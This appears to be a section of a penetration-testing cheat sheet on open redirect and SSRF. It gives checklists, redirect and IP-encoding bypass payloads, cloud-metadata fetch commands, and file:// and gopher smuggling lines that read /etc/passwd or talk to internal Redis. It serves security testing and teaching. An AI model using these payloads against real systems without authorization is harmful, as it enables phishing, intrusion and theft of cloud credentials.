# 6. Open Redirect & SSRF

## Open Redirect
**What it is:** a parameter controls where the site redirects to, letting attackers craft `https://target.com/...?redirect=evil.com` links that look trustworthy for phishing.

### Test checklist
- [ ] Any `?redirect=`, `?url=`, `?next=`, `?return=`, `?continue=`, `?dest=` parameter
- [ ] Logout/login links (common redirect targets even on otherwise static sites)
- [ ] Does it accept `//evil.com` (protocol-relative) or `https:evil.com`?
- [ ] Does it accept `/\evil.com` or `https://target.com.evil.com` (bypass filters that only check prefix)?

**Payloads**
```
?redirect=https://evil.com
?redirect=//evil.com
?redirect=/\evil.com
?redirect=https://target.com@evil.com
?redirect=https://target.com.evil.com
```

### Linux (Kali)
```
curl -sI "https://target.com/out?redirect=https://evil.com" | grep -i location
# Bulk-check many params found via gau/waybackurls:
cat wayback.txt | grep -E "redirect=|url=|next=" 
oralyzer -u urls_with_redirect_params.txt   # dedicated open-redirect scanner
```

### Windows
```
(Invoke-WebRequest "https://target.com/out?redirect=https://evil.com" -MaximumRedirection 0 -UseBasicParsing -ErrorAction SilentlyContinue).Headers.Location
```

## SSRF (Server-Side Request Forgery)
**Where it applies:** any "fetch a URL for me" feature \u2014 image proxy/thumbnail generator, URL preview/unfurl, webhook/callback URL field, PDF-from-URL export, "import from URL" on a contact/upload form.

### Test checklist
- [ ] Point the fetched URL at `http://169.254.169.254/latest/meta-data/` (cloud metadata \u2014 AWS/GCP/Azure)
- [ ] Point at `http://localhost:PORT` / `http://127.0.0.1` / internal RFC1918 ranges to find internal services
- [ ] Try DNS rebinding / redirect chains to bypass naive allow-list checks (`http://evil.com` that 302s to internal IP)
- [ ] Try alternate IP encodings: `http://0x7f000001`, `http://2130706433`, `http://[::1]`

**Linux**
```
# Stand up a listener to confirm outbound SSRF callback
nc -lvnp 8080
curl "https://target.com/preview?url=http://YOUR_IP:8080/ssrf-test"
# Interact.sh / Burp Collaborator for blind SSRF confirmation
```

**Windows**
```
# Netcat alternative:
ncat -lvnp 8080          # Nmap's ncat ships cross-platform
# or use a Burp Collaborator / interact.sh payload the same way via Invoke-WebRequest
```

**Impact framing:** open redirect alone = low-medium (phishing aid); SSRF reaching cloud metadata or internal services = critical.

## Advanced / Bypass Techniques

### Open redirect filter bypasses (when the obvious `?redirect=evil.com` is blocked)
```
?redirect=https://evil.com%2f%2ftarget.com                 # encoded slashes confuse naive prefix checks
?redirect=https:/evil.com                                   # single slash, many parsers still treat as absolute
?redirect=https:///evil.com                                 # triple slash
?redirect=//evil.com/%2e%2e                                 # path traversal trick on top of protocol-relative
?redirect=\evil.com                                         # backslash, normalized to // by some browsers (IE/old Edge especially, still relevant for internal tools)
?redirect=https://target.com.evil.com                       # subdomain-confusion, same class as the CORS regex bugs
?redirect=https://evil.com%00.target.com                    # null byte truncation on old parsers
?redirect=//%2509/evil.com                                  # tab character encoded inside the host confuses some URL parsers into treating it as same-origin
```

### SSRF \u2014 bypassing allow-list/deny-list filters on the destination
```
# IP encoding tricks (all resolve to 127.0.0.1, bypass simple string-match blocklists on "localhost"/"127.0.0.1")
http://0x7f000001/
http://2130706433/
http://017700000001/                      # octal
http://127.1/                             # short form
http://[::ffff:127.0.0.1]/                # IPv4-mapped IPv6
http://127.000.000.1/                     # zero-padded octets, some parsers normalize differently than the filter does

# DNS rebinding (passes an initial allow-list check, then resolves to an internal IP on the actual fetch)
# Use a rebinding service like lock.cmpxchg8b.com or your own DNS server with a short TTL

# Redirect-based bypass (filter checks the URL you provide, not where it 302s to)
curl -s "https://target.com/preview?url=https://your-server.com/redirect-to-internal"
# your-server.com returns: HTTP/1.1 302 Found \n Location: http://169.254.169.254/latest/meta-data/

# Cloud metadata specifics \u2014 IMDSv2 requires a token header, which most SSRF vectors can't set:
curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT http://169.254.169.254/latest/api/token   # only works with direct access, not via SSRF unless the app forwards custom headers
# GCP metadata needs a specific header too, but it's commonly missed by developers:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
# If the app only fetches and doesn't let you set headers, IMDSv1 (still enabled on many instances) has no such requirement \u2014 always worth trying first
```

### Protocol smuggling via SSRF (when HTTP(S) is blocked but the fetcher is naive about schemes)
```
file:///etc/passwd
gopher://127.0.0.1:6379/_SET%20key%20value          # gopher can be used to speak raw protocols like Redis, worth noting if internal Redis/Memcached is suspected
dict://127.0.0.1:11211/stats
```

### Blind SSRF confirmation at scale
```
# Kali \u2014 fuzz every URL-accepting parameter found in recon against your own Collaborator/interactsh domain
ffuf -u "https://target.com/FUZZ" -w params.txt -d "url=https://YOUR-ID.oastify.com"
```

**Resources:** PortSwigger SSRF and Open Redirection labs/cheat sheets, PayloadsAllTheThings SSRF section (has the most complete IP-encoding and cloud-metadata bypass list), Orange Tsai's SSRF research on URL parser confusion.
